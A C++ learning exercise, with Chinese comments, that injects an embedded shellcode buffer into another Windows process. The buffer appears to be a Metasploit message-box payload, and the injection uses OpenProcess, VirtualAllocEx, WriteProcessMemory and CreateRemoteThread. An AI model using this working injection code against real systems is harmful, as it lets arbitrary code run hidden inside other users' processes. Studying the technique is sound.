// 进程与线程2：远程线程.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>

unsigned char buf[] =
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
"\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
"\x68\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"
"\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"
"\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
"\x55\x08";
/*
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes, //安全描述符
  [in]  SIZE_T                 dwStackSize,         //堆栈大小
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,      //线程回调函数
  [in]  LPVOID                 lpParameter,         //参数
  [in]  DWORD                  dwCreationFlags,     //0
  [out] LPDWORD                lpThreadId           //线程ID
);
hProcess:进程句柄

*/
/*
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
hProcess:进程句柄
lpAddress：申请内存在目标进程中的地址可填NULL
dwSize: 分配内存大小
flAllocationType：内存类型MEM_COMMIT
flProtect：内存属性：PAGE_EXECUTE_READWRITE：可读可写可执行
*/
/*
DWORD GetModuleFileNameExW(
  [in]           HANDLE  hProcess,
  [in, optional] HMODULE hModule,
  [out]          LPWSTR  lpFilename,
  [in]           DWORD   nSize
);
hProcess:	进程句柄
hModule：模块句柄，NULL为主模块
lpFilename: 带路径的文件名
nSize：文件名缓冲区大小
*/

int main()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 28024);
	if (hProcess != INVALID_HANDLE_VALUE) {
		LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, 300, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		SIZE_T dwRealWrite;
		if (lpBuffer) {
			WriteProcessMemory(hProcess, lpBuffer, buf, strlen((const char*)buf) + 1, &dwRealWrite);
			CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, 0, NULL);
		}
		CloseHandle(hProcess);
	}
	

}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
